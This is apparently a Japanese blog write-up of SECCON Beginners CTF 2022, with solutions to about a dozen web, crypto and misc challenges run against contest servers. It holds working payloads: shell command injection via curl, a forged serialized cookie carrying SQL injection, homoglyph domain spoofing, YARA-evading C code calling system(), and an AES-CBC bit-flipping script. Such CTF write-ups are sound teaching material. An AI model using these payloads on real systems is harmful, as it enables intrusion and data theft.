# SECCON Beginners CTF 2022 Write-Up
(2022/6/9)

昨年に引き続きSECCON Beginners CTFに参加しました。1人で参加して、結果は65位（1106pt）でした。昨年は92位だったので順位が上がって良かったです。一方で、PwnableとReversingが全然解けませんでした。ちゃんと勉強します…

## Util (Web)
入力したIPアドレスにpingを飛ばすウェブサービスからフラグを得る問題です。

ソースコードを見ると受け取った入力をコマンドにそのまま埋め込んでシェルで実行していたので、入力の末尾に`; ls`や`; cat ...`を付けて送れば良さそうです。

さらに読み進めるとフロントエンドでは入力がIPアドレスかどうか検証しているがバックエンドでは検証していないことに気づきました。よって、curlからリクエストを送れば検証を避けられます。

最終的に以下のコマンドを実行してフラグを得ました。
```bash
curl -H "Content-Type: application/json" -d '{"address": "127.0.0.1; ls /"}' https://util.quals.beginners.seccon.jp/util/ping
curl -H "Content-Type: application/json" -d '{"address": "127.0.0.1; cat flag_A74FIBkN9sELAjOc.txt"}' https://util.quals.beginners.seccon.jp/util/ping
```

## textex
TeXをPDFに変換するウェブサービスからフラグを得る問題です。

中身を見ると`flag`というファイルにフラグが保存されていることが分かるのでこのファイルを読み込めばいいのですが、TeXコード内の`flag`はサーバー内で消されてしまうので工夫が必要です。

その工夫はすぐに思いつきました。マクロを使って`flag`という文字列を動的に生成すればいいです。そこで以下のコードを送ってみます。

```latex
\documentclass{article}
\newcommand{\x}[1]{fl#1}
\newcommand{\y}{\x{ag}}
\begin{document}

\input{\y}

\end{document}
```

しかしこれではうまくいきませんでした。その後かなり悩みましたが、フラグに（通常は）数式でしか使えない`_`が含まれているからだとなんとか気づきました。

`\input{\y}`を`\(\)`で囲うとフラグが表示されますが、`_`が欠落してしまいます。そのため、`_`のカテゴリーコードを変更し、`\(\)`の代わりに`\texttt`を使いました。ただ、それでも`{}`が欠落するので後で補うことで完全なフラグを得ました。

```latex
\documentclass{article}
\newcommand{\x}[1]{fl#1}
\newcommand{\y}{\x{ag}}
\begin{document}

\catcode`_=12
\texttt{\input{\y}}

\end{document}
```

## gallery
画像ファイルをその拡張子で検索し閲覧できるウェブサービスからフラグを得る問題です。

問題の説明文からフラグの書かれたファイルが画像ファイルの中に紛れ込んでいると推測しました。ソースコードを読むと検索に使う文字列は拡張子でなくてもいいことが分かりました。しかしながら、前問同様`flag`という文字列が消されてしまうので、`f`で検索したところ`flag_7a96139e-71a2-4381-bf31-adf37df94c04.pdf`というファイルが見つかりました。

このファイルをダウンロードしたいのですが、サーバーはレスポンスの長さが一定量を超えるとその中身をマスキングしてしまいます。マスキングを回避するにはファイルを分割してダウンロードできればいいのでその方法を調べたところ[range request](https://developer.mozilla.org/en-US/docs/Web/HTTP/Range_requests)というものがあることが分かりました。

最終的にrange requestで得られたファイルの断片を結合しその中身を見ることでフラグが得られました。

```bash
curl https://gallery.quals.beginners.seccon.jp/images/flag_7a96139e-71a2-4381-bf31-adf37df94c04.pdf -H "Range: bytes=0
-10000" -o p1
curl https://gallery.quals.beginners.seccon.jp/images/flag_7a96139e-71a2-4381-bf31-adf37df94c04.pdf -H "Range: bytes=10001-20000" -o p2
cat p1 p2 > flag.pdf
```

## serial
データベースからフラグを得る問題です。

SQL injectionができるところを探して、`database.php`の`findUserByName`という関数を見つけました。さらにこの関数はログイン時に使用されていて、`__CRED`という名前のクッキーに保存されているユーザー情報を改ざんできればSQL injectionができることが分かりました。

`__CRED`にはユーザー情報をBase64エンコードしたものが保存されていました。それを`base64 -d`でデコードすると以下のような文字列が得られました。
```
O:4:"User":3:{s:2:"id";s:2:"12";s:4:"name";s:1:"a";s:13:"password_hash";s:60:"$2y$10$CUhtPLDsV98Mi4sFrfEclO7VK0wna9H/nxN9zd2pB5bEeEtrisVt6";}
```

この文字列の`name`の部分を変えて以下のような文字列を作りました（`s:`の直後の数値を`serial(中略)'' = '`の文字数に変えています）。
```
O:4:"User":3:{s:2:"id";s:2:"12";s:4:"name";s:130:"serialserialserial' UNION SELECT body, 'a', '$2y$10$CUhtPLDsV98Mi4sFrfEclO7VK0wna9H/nxN9zd2pB5bEeEtrisVt6' FROM flags WHERE '' = '";s:13:"password_hash";s:60:"$2y$10$CUhtPLDsV98Mi4sFrfEclO7VK0wna9H/nxN9zd2pB5bEeEtrisVt6";}
```

そして、変更後の文字列を`base64 -w0`でエンコードして`__CRED`にセットしました（`-w0`を使うと余計な改行が行われません）。それからウェブページにアクセスし`__CRED`の値を見てみるとフラグが入っていました。

```
O:4:"User":3:{s:2:"id";s:43:"ctf4b{Ser14liz4t10n_15_v1rtually_pl41ntext}";s:4:"name";s:1:"a";s:13:"password_hash";s:60:"$2y$10$CUhtPLDsV98Mi4sFrfEclO7VK0wna9H/nxN9zd2pB5bEeEtrisVt6";}
```

## phisher
画像にしてOCRした結果が`www.example.com`となる文字列を答える問題です。ただし、答える文字列には`www.example.com`の文字が含まれてはいけません。

文字を画像にするのにMurechoというフォントが使われていたので、[Murecho - Google Fonts](https://fonts.google.com/specimen/Murecho?subset=japanese&sort=date#glyphs)からそれぞれの文字に似ているものを探しました。その結果、`www`に対して`ωωω`、`example`に対して`еχαмρΙе`、`com`に対して`сом`が見つかりました。

残る`.`は苦労しました。色々調べて[Homoglyph Attack Generator and Punycode Converter](https://www.irongeek.com/homoglyph-attack-generator.php)というサイトを発見し、`․`が見つかりました（違いが分からない…）。

見つけた文字列を結合した`ωωω․еχαмρΙе․сом`を送ってフラグが得られました。

## H2
与えられた`capture.pcap.xz`（を解凍したもの）をWiresharkに読ませてごにょごにょしたらフラグが得られました。

## ultra_super_miracle_validator
C言語のコードを送るとコンパイルして実行するサーバーからフラグを得る問題です。

送るコードは何でもいいというわけではなく、別に与えられるYARAファイルが記述する制約を満たさないコードのみが実行されるようになっていました。

与えられた制約を見ると命題論理式の形をしていたので、SATソルバーZ3で制約を満たさない条件を見つけ、その条件に合うプログラムを生成することにしました。以下が生成プログラムです。

```python
from z3 import *
from Crypto.Util.number import *

x = [Bool(f"x{i}") for i in range(41)]

solver = Solver()
# 制約を満たさないようにしたいのでnotは外している
cond = (And(Or(x[1], Or(x[6], Or(x[12], Or(Not(x[21]), x[32])))), And(Or(x[3], Or(x[5], Or(Not(x[11]), Or(x[24], x[35])))), And(Or(Not(x[3]), Or(x[31], Or(x[40], Or(x[9], x[27])))), And(Or(x[4], Or(x[8], Or(x[10], Or(x[29], x[40])))), And(Or(x[4], Or(x[7], Or(x[11], Or(x[25], Not(x[36]))))), And(Or(x[8], Or(x[14], Or(x[18], Or(x[21], x[38])))), And(Or(x[12], Or(x[15], Or(Not(x[20]), Or(x[30], x[35])))), And(Or(x[19], Or(x[21], Or(Not(x[32]), Or(x[33], x[39])))), And(Or(x[2], Or(x[37], Or(x[19], Not(x[23])))), And(Or(Not(x[5]), Or(x[14], Or(x[23], x[30]))), And(Or(Not(x[5]), Or(x[8], Or(x[18], x[23]))), And(Or(x[33], Or(x[22], Or(x[4], x[38]))), And(Or(x[2], Or(x[20], x[39])), And(Or(x[3], Or(x[15], Not(x[30]))), And(Or(x[6], Or(Not(x[17]), x[30])), And(Or(x[8], Or(x[29], Not(x[21]))), And(Or(Not(x[16]), Or(x[1], x[29])), And(Or(x[20], Or(x[10], Not(x[5]))), And(Or(Not(x[13]), x[25]), And(Or(x[21], Or(x[28], x[30])), And(Not(x[2]), And(x[3], And(Not(x[7]), And(Not(x[10]), And(Not(x[11]), And(x[14], And(Not(x[15]), And(Not(x[22]), And(x[26], And(Not(x[27]), And(x[34], And(x[36], And(x[37], Not(x[40])))))))))))))))))))))))))))))))))))
solver.add(cond)

y = [[]] * 41
y[1] = [0xe3, 0x82, 0x89, 0xe3, 0x81, 0x9b, 0xe3, 0x82, 0x93, 0xe9, 0x9a, 0x8e, 0xe6, 0xae, 0xb5]
y[2] = [0xe3, 0x82, 0xab, 0xe3, 0x83, 0x96, 0xe3, 0x83, 0x88, 0xe8, 0x99, 0xab]
y[3] = [0xe5, 0xbb, 0x83, 0xe5, 0xa2, 0x9f, 0xe3, 0x81, 0xae, 0xe8, 0xa1, 0x97]
y[4] = [0xe3, 0x82, 0xa4, 0xe3, 0x83, 0x81, 0xe3, 0x82, 0xb8, 0xe3, 0x82, 0xaf, 0xe3, 0x81, 0xae, 0xe3, 0x82, 0xbf, 0xe3, 0x83, 0xab, 0xe3, 0x83, 0x88]
y[5] = [0xe3, 0x83, 0x89, 0xe3, 0x83, 0xad, 0xe3, 0x83, 0xad, 0xe3, 0x83, 0xbc, 0xe3, 0x82, 0xb5, 0xe3, 0x81, 0xb8, 0xe3, 0x81, 0xae, 0xe9, 0x81, 0x93]
y[6] = [0xe7, 0x89, 0xb9, 0xe7, 0x95, 0xb0, 0xe7, 0x82, 0xb9]
y[7] = [0xe3, 0x82, 0xb8, 0xe3, 0x83, 0xa7, 0xe3, 0x83, 0x83, 0xe3, 0x83, 0x88]
y[8] = [0xe5, 0xa4, 0xa9, 0xe4, 0xbd, 0xbf]
y[9] = [0xe7, 0xb4, 0xab, 0xe9, 0x99, 0xbd, 0xe8, 0x8a, 0xb1]
y[10] = [0xe7, 0xa7, 0x98, 0xe5, 0xaf, 0x86, 0xe3, 0x81, 0xae, 0xe7, 0x9a, 0x87, 0xe5, 0xb8, 0x9d]
y[11] = [0x82, 0xe7, 0x82, 0xb9, 0x82, 0xf1, 0x8a, 0x4b, 0x92, 0x69]
y[12] = [0x83, 0x4a, 0x83, 0x75, 0x83, 0x67, 0x92, 0x8e]
y[13] = [0x94, 0x70, 0x9a, 0xd0, 0x82, 0xcc, 0x8a, 0x58]
y[14] = [0x83, 0x43, 0x83, 0x60, 0x83, 0x57, 0x83, 0x4e, 0x82, 0xcc, 0x83, 0x5e, 0x83, 0x8b, 0x83, 0x67]
y[15] = [0x83, 0x68, 0x83, 0x8d, 0x83, 0x8d, 0x81, 0x5b, 0x83, 0x54, 0x82, 0xd6, 0x82, 0xcc, 0x93, 0xb9]
y[16] = [0x93, 0xc1, 0x88, 0xd9, 0x93, 0x5f]
y[17] = [0x83, 0x57, 0x83, 0x87, 0x83, 0x62, 0x83, 0x67]
y[18] = [0x93, 0x56, 0x8e, 0x67]
y[19] = [0x8e, 0x87, 0x97, 0x7a, 0x89, 0xd4]
y[20] = [0x94, 0xe9, 0x96, 0xa7, 0x82, 0xcc, 0x8d, 0x63, 0x92, 0xe9]
y[21] = [0x30, 0x89, 0x30, 0x5b, 0x30, 0x93, 0x96, 0x8e, 0x6b, 0xb5]
y[22] = [0x30, 0x4b, 0x30, 0x76]
y[23] = [0x5e, 0xc3, 0x58, 0x9f, 0x30, 0x6e, 0x88, 0x57]
y[24] = [0x30, 0xa4, 0x30, 0xc1, 0x30, 0xb8, 0x30, 0xaf, 0x30, 0x6e, 0x30, 0xbf, 0x30, 0xeb, 0x30, 0xc8]
y[25] = [0x30, 0xc9, 0x30, 0xed, 0x30, 0xed, 0x30, 0xfc, 0x30, 0xb5, 0x30, 0x78, 0x30, 0x6e, 0x90, 0x53]
y[26] = [0x72, 0x79, 0x75, 0x70, 0x70, 0xb9]
y[27] = [0x30, 0xb8, 0x30, 0xe7, 0x30, 0xc3, 0x30, 0xc8]
y[28] = [0x59, 0x29, 0x4f, 0x7f]
y[29] = [0x7d, 0x2b, 0x96, 0x7d, 0x82, 0xb1]
y[30] = [0x79, 0xd8, 0x5b, 0xc6, 0x30, 0x6e, 0x76, 0x87, 0x5e, 0x1d]
y[31] = [0x2b, 0x4d, 0x49, 0x6b, 0x2d, 0x2b, 0x4d, 0x46, 0x73, 0x2d, 0x2b, 0x4d, 0x4a, 0x4d, 0x2d, 0x2b, 0x6c, 0x6f, 0x34, 0x2d]
y[32] = [0x2b, 0x4d, 0x45, 0x73, 0x2d, 0x2b, 0x4d, 0x48]
y[33] = [0x2b, 0x58, 0x73, 0x4d, 0x2d, 0x2b, 0x57, 0x4a, 0x38, 0x2d, 0x2b, 0x4d, 0x47, 0x34, 0x2d, 0x2b]
y[34] = [0x2b, 0x4d, 0x4b, 0x51, 0x2d, 0x2b, 0x4d, 0x4d, 0x45, 0x2d, 0x2b, 0x4d, 0x4c, 0x67, 0x2d, 0x2b, 0x4d, 0x4b, 0x38, 0x2d, 0x2b, 0x4d, 0x47, 0x34, 0x2d, 0x2b, 0x4d, 0x4c, 0x38, 0x2d, 0x2b, 0x4d]
y[35] = [0x2b, 0x4d, 0x4d, 0x6b, 0x2d, 0x2b, 0x4d, 0x4f, 0x30, 0x2d, 0x2b, 0x4d, 0x4f, 0x30, 0x2d, 0x2b, 0x4d, 0x50, 0x77, 0x2d, 0x2b, 0x4d, 0x4c, 0x55, 0x2d, 0x2b, 0x4d, 0x48, 0x67, 0x2d, 0x2b, 0x4d]
y[36] = [0x2b, 0x63, 0x6e, 0x6b, 0x2d, 0x2b, 0x64, 0x58, 0x41, 0x2d, 0x2b, 0x63]
y[37] = [0x2b, 0x4d, 0x4c, 0x67, 0x2d, 0x2b, 0x4d, 0x4f, 0x63, 0x2d, 0x2b, 0x4d, 0x4d, 0x4d, 0x2d, 0x2b]
y[38] = [0x2b, 0x57, 0x53, 0x6b, 0x2d, 0x2b, 0x54, 0x33]
y[39] = [0x2b, 0x66, 0x53, 0x73, 0x2d, 0x2b, 0x6c, 0x6e, 0x30, 0x2d, 0x2b, 0x67]
y[40] = [0x2b, 0x65, 0x64, 0x67, 0x2d, 0x2b, 0x57, 0x38, 0x59, 0x2d, 0x2b, 0x4d, 0x47, 0x34, 0x2d, 0x2b, 0x64, 0x6f, 0x63, 0x2d]

fp = open("code.c", "w")

if solver.check() == sat:
    m = solver.model()
    for i in range(1, 41):
        if m[x[i]]:
            fp.write('char x' + str(i) + "[] = {" + ", ".join([str(j) for j in y[i]]) + "}; ")

fp.write("int main(int argc, char *argv[]){/* write here */ return 0;}\n")
fp.close()
```

ちょっとした工夫として`cond`の右辺は次のように作りました。
1. YARAファイルのconditionを取ってくる
2. 正規表現を使って`$xi`（`i`は整数）を`x[i]`に置き換える
3. さらに`and`、`or`、`not`を`&&`、`||`、`not`に置き換える
4. 以下のOCamlプログラムを実行する
```ocaml
let (&&) x y = "And(" ^ x ^ ", " ^ y ^ ")" in
let (||) x y = "Or(" ^ x ^ ", " ^ y ^ ")" in
let not x = "Not(" ^ x ^ ")" in
let expr = (* 3で得られた文字列 *) in
print_endline expr
```

`y[i]`の右辺も同様の方法で変形していきました。

結果として以下のようなプログラムが得られました。
```c
char x3[] = {229, 187, 131, 229, 162, 159, 227, 129, 174, 232, 161, 151}; char x4[] = {227, 130, 164, 227, 131, 129, 227, 130, 184, 227, 130, 175, 227, 129, 174, 227, 130, 191, 227, 131, 171, 227, 131, 136}; char x8[] = {229, 164, 169, 228, 189, 191}; char x12[] = {131, 74, 131, 117, 131, 103, 146, 142}; char x14[] = {131, 67, 131, 96, 131, 87, 131, 78, 130, 204, 131, 94, 131, 139, 131, 103}; char x20[] = {148, 233, 150, 167, 130, 204, 141, 99, 146, 233}; char x21[] = {48, 137, 48, 91, 48, 147, 150, 142, 107, 181}; char x26[] = {114, 121, 117, 112, 112, 185}; char x31[] = {43, 77, 73, 107, 45, 43, 77, 70, 115, 45, 43, 77, 74, 77, 45, 43, 108, 111, 52, 45}; char x34[] = {43, 77, 75, 81, 45, 43, 77, 77, 69, 45, 43, 77, 76, 103, 45, 43, 77, 75, 56, 45, 43, 77, 71, 52, 45, 43, 77, 76, 56, 45, 43, 77}; char x36[] = {43, 99, 110, 107, 45, 43, 100, 88, 65, 45, 43, 99}; char x37[] = {43, 77, 76, 103, 45, 43, 77, 79, 99, 45, 43, 77, 77, 77, 45, 43}; int main(int argc, char *argv[]){system("cat flag.txt"); return 0;}
```

最後に`/* write here */`を`system(...)`に置き換えてサーバーに送ることでフラグが得られました。

## hitchhike4b
変数にフラグ（の一部）を入れて`help`関数を呼ぶプログラムからフラグを得る問題です。

適当にいじっていたら解けたので手順だけ書いておきます。

フラグの前半：`__main__`を入力
フラグの後半：(1) `modules`と入力。`app_35f13ca33b0cc8c9e7d723b78627d39aceeac1fc`が見つかる。(2) `app_35f13ca33b0cc8c9e7d723b78627d39aceeac1fc`と2回入力

## Quiz
クイズを出すプログラムからフラグを得る問題です。

とりあえずクイズを解いていくと4問目でフラグを聞いてきました。当然分からないのですが、3問目の答えが`strings`だったので、試しに`strings quiz`を実行するとフラグが得られました。

## CoughingFox
次のような問題です。
>数列 $(f_i)$ から $c_i = (f_i + i)^2 + i$ によって数列 $(c_i)$ を作る。
>$(c_i)$ の要素をランダムにシャッフルした数列 $(d_i)$ から $(f_i)$ を復元せよ。

一意に定まるんだと思いながら解きました。$d_i = c_j$ となる必要条件は $d_i - j$ が平方数になることなので、すべての $i$ に対してそのような $j$ を求めて $(c_i), (f_i)$ を再構成したらフラグが得られました（？）。

フラグを得るのに使ったプログラムは以下の通りです。

```python
from math import sqrt, floor

def is_square(x):
    i = 0
    while i * i < x:
        i += 1
    return i * i == x

cipher = [12147, 20481, 7073, 10408, 26615, 19066, 19363, 10852, 11705, 17445, 3028, 10640, 10623, 13243, 5789, 17436, 12348, 10818, 15891, 2818, 13690, 11671, 6410, 16649, 15905, 22240, 7096, 9801, 6090, 9624, 16660, 18531, 22533, 24381, 14909, 17705, 16389, 21346, 19626, 29977, 23452, 14895, 17452, 17733, 22235, 24687, 15649, 21941, 11472]

n = len(cipher)

print("n = ", n)

flag = [0] * n

for c in cipher:
    for i in range(n):
        if is_square(c - i):
            flag[i] = floor(sqrt(c - i)) - i
            break

print(bytes(flag)) # b'ctf4b{Hey,Fox?YouCanNotTearThatHouseDown,CanYou?}'
```

## PrimeParty
次のような問題です。
>あなたは3個以下の素数を選ぶことができる。サーバーは別に秘密の素数をランダムに4つ選ぶ。選ばれた素数の積を $n$ とする。
>$n, e = 65537, \mathrm{cipher} = \mathrm{flag} ^ e \bmod{n}$ から $\mathrm{flag}$ を求めよ。  
>（ただし、サーバーが選ぶ素数は256bit、$\mathrm{flag}$ は455bitであるとする。）

素数 $p$ をうまく選ぶことで(1) $e$ と $p - 1$ は互いに素、(2) $p$ はサーバーが選んだどの素数とも異なる、(3) $\mathrm{flag} < p$ を満たすようにできます。

(1)より $es + (p - 1)t = 1$ を満たす整数 $s, t$ が存在します。

(2)より $p$ と $n / p$ は互いに素なので、$\mathrm{flag} ^ e \equiv \mathrm{cipher} \pmod{n}$ より $\mathrm{flag} ^ e \equiv \mathrm{cipher} \pmod{p}$ が成り立ちます。
両辺を $s$ 乗すると、$\mathrm{flag} \equiv \mathrm{cipher} ^ s \pmod{p}$ となります。

(3)より $\mathrm{flag} = \mathrm{cipher} ^ s \bmod{p}$ で $\mathrm{flag}$ が求まります。

以下のプログラムでフラグが得られます。

```python
from pwn import *
from Crypto.Util.number import *

def extgcd(a, b):
    s1 = 1
    t1 = 0
    s2 = 0
    t2 = 1
    while b != 0:
        [s1, t1, s2, t2] = [s2, t2, s1 - (a // b) * s2, t1 - (a // b) * t2]
        [a, b] = [b, a % b]
    return [s1, t1, a]

p = getPrime(456)

io = remote("primeparty.quals.beginners.seccon.jp", 1336)

io.sendlineafter(" > ", str(p).encode())
io.sendlineafter(" > ", b"1")
io.sendlineafter(" > ", b"1")

io.recvuntil("n =")
n = int(io.recvline().strip())

io.recvuntil("e =")
e = int(io.recvline().strip())

io.recvuntil("cipher =")
cipher = int(io.recvline().strip())

io.close()

[s, t, g] = extgcd(e, p - 1)
s = s % (p - 1)

flag = long_to_bytes(pow(cipher, s, p))

print(flag) # ctf4b{HopefullyWeCanFindSomeCommonGroundWithEachOther!!!}
```

## Command
フラグを出力するコマンドを実行させる問題です。

CBCモードのAESが使われていること、initialization vectorが自由に決められることを踏まえて次のようなプログラムを実行してフラグを得ました。

```python
from pwn import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Util.number import isPrime

def xor(a1, a2):
    return bytes([a1[i] ^ a2[i] for i in range(len(a1))])

io = remote("command.quals.beginners.seccon.jp", 5555)

io.sendline(b"1")
io.sendline(b"fizzbuzz")

io.recvuntil(b"Encrypted command: ")
cmd = bytes.fromhex(io.recvline().strip().decode())
iv, enc = cmd[:16], cmd[16:]
iv2 = xor(pad(b'fizzbuzz', 16), xor(pad(b'getflag', 16), iv))

io.sendline(b"2")
io.sendline((iv2 + enc).hex())

io.recvuntil("ctf4b")
flag = "ctf4b{}".format(io.recvline().strip().decode())

io.close()

print(flag) # ctf4b{b1tfl1pfl4ppers}
```
